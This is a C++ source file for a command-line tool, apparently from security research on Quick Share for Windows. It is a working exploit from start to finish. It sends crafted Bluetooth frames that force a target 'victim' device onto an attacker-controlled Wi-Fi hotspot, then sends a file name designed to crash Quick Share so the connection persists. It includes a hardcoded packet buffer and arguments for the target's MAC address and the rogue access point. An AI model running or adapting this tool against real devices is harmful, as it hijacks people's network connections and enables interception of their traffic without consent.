#include <vector>
#include <iostream>
#include <argparse/argparse.hpp>

#include "quick_share/include/quick_share_medium.hh"
#include "quick_share/include/quick_share_connection.hh"
#include "quick_share/include/exceptions.hh"
#include "tools/include/offline_frames_storage.hh"
#include "logger/include/logger.hh"

#pragma warning( push )
#pragma warning( disable : 4838) 

const char BASE_FORCE_WIFI_CONNECTION_PACKETS_BUFFER[763] = {
    0x6C, 0x02, 0x00, 0x00, 0x08, 0x01, 0x12, 0xE7, 0x04, 0x08, 0x01, 0x12, 0xE2, 0x04, 0x0A, 0x04,
    0x4C, 0x47, 0x46, 0x36, 0x12, 0x27, 0x06, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x15, 0x53, 0x61, 0x66, 0x65, 0x42, 0x72, 0x65, 0x61,
    0x63, 0x68, 0x20, 0x53, 0x69, 0x6D, 0x75, 0x6C, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0xC9, 0x80,
    0x9D, 0xC8, 0x06, 0x28, 0x05, 0x28, 0x03, 0x28, 0x02, 0x28, 0x04, 0x32, 0x27, 0x06, 0x41, 0x41,
    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x15, 0x53,
    0x61, 0x66, 0x65, 0x42, 0x72, 0x65, 0x61, 0x63, 0x68, 0x20, 0x53, 0x69, 0x6D, 0x75, 0x6C, 0x61,
    0x74, 0x69, 0x6F, 0x6E, 0x3A, 0xF2, 0x03, 0x08, 0x01, 0x12, 0x11, 0x41, 0x41, 0x3A, 0x41, 0x41,
    0x3A, 0x41, 0x41, 0x3A, 0x41, 0x41, 0x3A, 0x41, 0x41, 0x3A, 0x41, 0x41, 0x1A, 0x04, 0xC0, 0xA8,
    0x89, 0x01, 0x20, 0x01, 0x28, 0x01, 0x30, 0xEC, 0x12, 0x3A, 0x50, 0x0A, 0x4E, 0x85, 0x2D, 0x8C,
    0x29, 0x99, 0x2D, 0xCC, 0x2B, 0xFC, 0x2A, 0xD8, 0x2C, 0xB4, 0x29, 0xC8, 0x29, 0x88, 0x2C, 0xB0,
    0x2C, 0xD0, 0x28, 0xBC, 0x28, 0xC1, 0x2D, 0xA4, 0x2B, 0x90, 0x2B, 0xD5, 0x2D, 0xC4, 0x2C, 0x9C,
    0x2C, 0xF8, 0x28, 0xE4, 0x28, 0xAD, 0x2D, 0xF4, 0x2B, 0xE0, 0x2B, 0xA0, 0x29, 0xF1, 0x2C, 0xB8,
    0x2B, 0x99, 0x13, 0xA3, 0x13, 0xF1, 0x12, 0x8F, 0x13, 0xF6, 0x12, 0x94, 0x13, 0x9E, 0x13, 0x80,
    0x13, 0x85, 0x13, 0xEC, 0x12, 0xA8, 0x13, 0x8A, 0x13, 0xFB, 0x12, 0x42, 0x70, 0x0A, 0x6E, 0xE7,
    0x31, 0x8B, 0x30, 0xCF, 0x2F, 0xDB, 0x30, 0xA7, 0x2F, 0xFB, 0x31, 0xBF, 0x31, 0xD7, 0x2E, 0xC3,
    0x2E, 0x9F, 0x30, 0x97, 0x31, 0xE3, 0x2F, 0xB3, 0x30, 0xEB, 0x2E, 0xFF, 0x2E, 0xEF, 0x30, 0xD3,
    0x31, 0xF7, 0x2F, 0x83, 0x31, 0xAB, 0x31, 0x8F, 0x32, 0x93, 0x2F, 0xC7, 0x30, 0xBB, 0x2F, 0xD5,
    0x2D, 0xD8, 0x2C, 0x8C, 0x29, 0xB0, 0x2C, 0xC8, 0x29, 0xAD, 0x2D, 0xF8, 0x28, 0xD0, 0x28, 0xE4,
    0x28, 0xC1, 0x2D, 0xA0, 0x29, 0x99, 0x2D, 0x85, 0x2D, 0x9C, 0x2C, 0xF1, 0x2C, 0xBC, 0x28, 0xC4,
    0x2C, 0xB4, 0x29, 0xF1, 0x12, 0x8F, 0x13, 0xFB, 0x12, 0x99, 0x13, 0x9E, 0x13, 0x85, 0x13, 0x8A,
    0x13, 0x94, 0x13, 0xA8, 0x13, 0xA3, 0x13, 0xF6, 0x12, 0xEC, 0x12, 0x80, 0x13, 0x4A, 0x70, 0x0A,
    0x6E, 0x8F, 0x32, 0xB3, 0x30, 0xCF, 0x2F, 0x8B, 0x30, 0xAB, 0x31, 0xD7, 0x2E, 0xBF, 0x31, 0xC7,
    0x30, 0x9F, 0x30, 0xE7, 0x31, 0x93, 0x2F, 0xF7, 0x2F, 0xE3, 0x2F, 0xA7, 0x2F, 0xEF, 0x30, 0x83,
    0x31, 0xFB, 0x31, 0x97, 0x31, 0xC3, 0x2E, 0xEB, 0x2E, 0xFF, 0x2E, 0xDB, 0x30, 0xD3, 0x31, 0xBB,
    0x2F, 0xB0, 0x2C, 0xD0, 0x28, 0xB4, 0x29, 0x85, 0x2D, 0xE4, 0x28, 0xA0, 0x29, 0x9C, 0x2C, 0xC8,
    0x29, 0xC4, 0x2C, 0xC1, 0x2D, 0xF8, 0x28, 0xF1, 0x2C, 0xBC, 0x28, 0xAD, 0x2D, 0x99, 0x2D, 0x8C,
    0x29, 0xD8, 0x2C, 0xD5, 0x2D, 0xA8, 0x13, 0x85, 0x13, 0x99, 0x13, 0x8A, 0x13, 0xFB, 0x12, 0x80,
    0x13, 0xF1, 0x12, 0xA3, 0x13, 0x9E, 0x13, 0x8F, 0x13, 0xF6, 0x12, 0xEC, 0x12, 0x94, 0x13, 0x52,
    0x26, 0x0A, 0x24, 0x99, 0x2D, 0xF1, 0x2C, 0x85, 0x2D, 0xAD, 0x2D, 0xC1, 0x2D, 0xFB, 0x12, 0x99,
    0x13, 0xEC, 0x12, 0x9E, 0x13, 0x8F, 0x13, 0xA3, 0x13, 0x94, 0x13, 0x85, 0x13, 0x8A, 0x13, 0xF1,
    0x12, 0xF6, 0x12, 0xA8, 0x13, 0x80, 0x13, 0x5A, 0x70, 0x0A, 0x6E, 0xD3, 0x31, 0xFF, 0x2E, 0x97,
    0x31, 0xC3, 0x2E, 0xE7, 0x31, 0xEF, 0x30, 0xF7, 0x2F, 0xBB, 0x2F, 0xC7, 0x30, 0xBF, 0x31, 0x93,
    0x2F, 0x8F, 0x32, 0xE3, 0x2F, 0xD7, 0x2E, 0xFB, 0x31, 0x9F, 0x30, 0xEB, 0x2E, 0xAB, 0x31, 0x83,
    0x31, 0xDB, 0x30, 0xA7, 0x2F, 0xB3, 0x30, 0xCF, 0x2F, 0x8B, 0x30, 0x85, 0x2D, 0xC8, 0x29, 0xB4,
    0x29, 0xBC, 0x28, 0xD8, 0x2C, 0x8C, 0x29, 0xC1, 0x2D, 0xF1, 0x2C, 0x99, 0x2D, 0xA0, 0x29, 0xD0,
    0x28, 0xD5, 0x2D, 0xC4, 0x2C, 0xB0, 0x2C, 0xAD, 0x2D, 0xF8, 0x28, 0xE4, 0x28, 0x9C, 0x2C, 0x8A,
    0x13, 0xEC, 0x12, 0xF6, 0x12, 0x85, 0x13, 0x99, 0x13, 0xA8, 0x13, 0xF1, 0x12, 0x80, 0x13, 0x8F,
    0x13, 0x94, 0x13, 0xA3, 0x13, 0x9E, 0x13, 0xFB, 0x12, 0x40, 0x88, 0x27, 0x48, 0xB0, 0xEA, 0x01,
    0x14, 0x00, 0x00, 0x00, 0x08, 0x01, 0x12, 0x10, 0x08, 0x02, 0x1A, 0x0C, 0x08, 0x00, 0x18, 0x01,
    0x22, 0x02, 0x08, 0x01, 0x28, 0x00, 0x38, 0x04, 0x1E, 0x00, 0x00, 0x00, 0x08, 0x01, 0x12, 0x1A,
    0x08, 0x04, 0x2A, 0x16, 0x08, 0x01, 0x12, 0x12, 0x08, 0x03, 0x12, 0x0A, 0x0A, 0x00, 0x12, 0x00,
    0x18, 0x00, 0x22, 0x00, 0x28, 0x00, 0x38, 0x00, 0x48, 0x00, 0x0A, 0x00, 0x00, 0x00, 0x08, 0x01,
    0x12, 0x06, 0x08, 0x04, 0x2A, 0x02, 0x08, 0x02, 0x0A, 0x00, 0x00, 0x00, 0x08, 0x01, 0x12, 0x06,
    0x08, 0x04, 0x2A, 0x02, 0x08, 0x03, 0x31, 0x00, 0x00, 0x00, 0x08, 0x01, 0x12, 0x2D, 0x08, 0x03,
    0x22, 0x29, 0x08, 0x01, 0x12, 0x17, 0x08, 0x87, 0xBD, 0xBE, 0xB6, 0xC3, 0xD3, 0xC5, 0x81, 0x74,
    0x10, 0x02, 0x18, 0x06, 0x2A, 0x07, 0x00, 0x62, 0x6C, 0x61, 0x62, 0x6C, 0x61, 0x1A, 0x0C, 0x08,
    0x00, 0x10, 0x00, 0x1A, 0x06, 0x62, 0x6C, 0x61, 0x62, 0x6C, 0x61 
};

#pragma warning( pop )

static const GUID QUICK_SHARE_BT_GUID = {0xA82EFA21, 0xAE5C, 0x3DDE, {0x9B, 0xBC, 0xF1, 0x6D, 0xA7, 0xB1, 0x6C, 0x5A}};
static const unsigned int PRE_DISCONNECTION_DELAY = 500; // millis

void force_wifi_connection(std::string target_bt_mac, std::string ap_ssid, std::string ap_password, unsigned int ap_frequency, std::string ip) {
    unsigned int ap_listen_port = 0; 
    BluetoothMedium bt_medium;

    struct timeval timeout;
    timeout.tv_sec = 10;
    timeout.tv_usec = 0;
    WifiHotspotMedium hotspot_medium(timeout);
    bt_medium.set_target(target_bt_mac.c_str(), QUICK_SHARE_BT_GUID);

    std::vector<std::unique_ptr<OfflineFrame>> offline_frames = parse_offline_frames_buffer(BASE_FORCE_WIFI_CONNECTION_PACKETS_BUFFER, sizeof(BASE_FORCE_WIFI_CONNECTION_PACKETS_BUFFER));
    auto offline_frames_iterator = offline_frames.begin();
    
    QuickShareConnection quick_share_connection(&bt_medium);
    logger_log(LoggerLogLevel::LEVEL_INFO, "Connecting...");
    quick_share_connection.connect();

    // Send CONNECTION_REQUEST
    logger_log(LoggerLogLevel::LEVEL_INFO, "Sending CONNECTION_REQUEST");
    // printf((**offline_frames_iterator).DebugString().c_str());
    quick_share_connection.send_offline_frame(**offline_frames_iterator++);
    
    logger_log(LoggerLogLevel::LEVEL_INFO, "Initiating UKEY2 handshake");
    quick_share_connection.do_handshake();

    // Receive CONNECTION_RESPONSE
    logger_log(LoggerLogLevel::LEVEL_INFO, "Receiving CONNECTION_RESPONSE");
    quick_share_connection.recv_offline_frame();

    // Send CONNECTION_RESPONSE
    logger_log(LoggerLogLevel::LEVEL_INFO, "Sending CONNECTION_RESPONSE");
    quick_share_connection.send_offline_frame(**offline_frames_iterator++);

    ap_listen_port = hotspot_medium.bind("0.0.0.0", 0);

    // Send Bandwidth Path Upgrade
    logger_log(LoggerLogLevel::LEVEL_INFO, "Sending UPGRADE_PATH_AVAILABLE");
    OfflineFrame & bandwidth_upgrade_offline_frame = **offline_frames_iterator++;
    bandwidth_upgrade_offline_frame.mutable_v1()->mutable_bandwidth_upgrade_negotiation()->mutable_upgrade_path_info()->mutable_wifi_hotspot_credentials()->set_ssid(ap_ssid);
    bandwidth_upgrade_offline_frame.mutable_v1()->mutable_bandwidth_upgrade_negotiation()->mutable_upgrade_path_info()->mutable_wifi_hotspot_credentials()->set_password(ap_password);
    bandwidth_upgrade_offline_frame.mutable_v1()->mutable_bandwidth_upgrade_negotiation()->mutable_upgrade_path_info()->mutable_wifi_hotspot_credentials()->set_gateway(ip);
    bandwidth_upgrade_offline_frame.mutable_v1()->mutable_bandwidth_upgrade_negotiation()->mutable_upgrade_path_info()->mutable_wifi_hotspot_credentials()->set_port(ap_listen_port);
    bandwidth_upgrade_offline_frame.mutable_v1()->mutable_bandwidth_upgrade_negotiation()->mutable_upgrade_path_info()->mutable_wifi_hotspot_credentials()->set_frequency(ap_frequency);
    
    quick_share_connection.send_offline_frame(bandwidth_upgrade_offline_frame, true);

    logger_log(LoggerLogLevel::LEVEL_INFO, "Setting medium to WifiHotspotMedium and waiting for the victim to connect");
    quick_share_connection.set_medium(&hotspot_medium);
    
    while (true) {
        try {
            quick_share_connection.connect();
        } catch(TimeoutException e) {
            quick_share_connection.set_medium(&bt_medium);
            quick_share_connection.recv_offline_frame(true);
            quick_share_connection.send_offline_frame(bandwidth_upgrade_offline_frame, true);
            quick_share_connection.set_medium(&hotspot_medium);
            continue;
        }

        break;
    }

    const char * client_ip = inet_ntoa(hotspot_medium.get_connected_client_sock_addr().sin_addr);
    printf("Victim successfully connected to our hotspot with IP: %s\n", client_ip);

    logger_log(LoggerLogLevel::LEVEL_INFO, "Setting medium to BluetoothMedium and receiving all leftover packets");
    quick_share_connection.set_medium(&bt_medium);
    while (true) {
        try {
            quick_share_connection.recv_offline_frame(true);
        } catch (TimeoutException exception) {
            logger_log(LoggerLogLevel::LEVEL_INFO, "Victim sent last packets over bluetooth, it's now safe to start closing the BluetoothMedium");
            break;
        }
    }

    logger_log(LoggerLogLevel::LEVEL_INFO, "Sending LAST_WRITE_TO_PRIOR_CHANNEL");
    quick_share_connection.send_offline_frame(**offline_frames_iterator++, true);

    logger_log(LoggerLogLevel::LEVEL_INFO, "Setting medium to WifiHotspotMedoium again and disconnecting BluetoothMedium");
    quick_share_connection.set_medium(&hotspot_medium);
    bt_medium.disconnect();

    logger_log(LoggerLogLevel::LEVEL_INFO, "Sending SAFE_TO_DISCONNECT_PRIOR_CHANNEL");
    quick_share_connection.send_offline_frame(**offline_frames_iterator++, true);

    logger_log(LoggerLogLevel::LEVEL_INFO, "Sending PayloadTransfer of FILE with name that crashes QuickShare");
    quick_share_connection.send_offline_frame(**offline_frames_iterator++, true);

    Sleep(PRE_DISCONNECTION_DELAY);

    quick_share_connection.disconnect();
}


int main(int argc, char ** argv) {
    argparse::ArgumentParser parser("force_wifi_connection.exe");
    parser.add_description(
        "Forces a target Quick Share device to connect to a specified WiFi network.\n"
        "To make the WiFi connection last indefinitely, a packet that crashes Quick Share for Windows is sent once the WiFi connection is established.\n"
        "Note: The easiest configuration for using this tool would be running it on a Windows computer with Windows' hotspot feature turned on and used "
        "as the the target WiFi network"
    );
    parser.add_argument("target_bt_mac").help("The bluetooth MAC address of the target Quick Share device");
    parser.add_argument("ap_ssid").help("The SSID of the WiFi network to connect to");
    parser.add_argument("ap_password").help("The password of the WiFi network to connect to");
    parser.add_argument("ap_freq").help(
        "The frequency in MHz of the WiFi AP to connect to.\n"
        "Advice: use a WiFi analyzer app on your phone to find the frequency"
    ).scan<'u', unsigned int>();;
    parser.add_argument("ip").help(
        "The IP to which the target Quick Share device needs to connect after the connection to the WiFi network was established.\n"
        "This program assumes that the IP address belongs to the same computer on which this program runs. Thus, in order for the flow "
        "of the program to continue successfully after the WiFi connection was established, the computer on which this program runs must "
        "be in the target WiFi network."
    );

    std::string target_bt_mac;
    std::string ap_ssid;
    std::string ap_password;
    std::string ip;
    unsigned int ap_frequency;

    try {
        parser.parse_args(argc, argv);
        target_bt_mac = parser.get("target_bt_mac");
        ap_ssid = parser.get("ap_ssid").c_str();
        ap_password = parser.get("ap_password").c_str();
        ip = parser.get("ip").c_str();
        ap_frequency = parser.get<unsigned int>("ap_freq");
    } catch (const std::exception &err) {
        std::cerr << err.what() << std::endl;
        std::cerr << parser;
        return 1;
    }
    
    try {
        force_wifi_connection(target_bt_mac, ap_ssid, ap_password, ap_frequency, ip);
    } catch (BaseException e) {
        logger_log(LoggerLogLevel::LEVEL_ERROR, "Got an exception:\n%s", e.what());
    }

    return 0;
}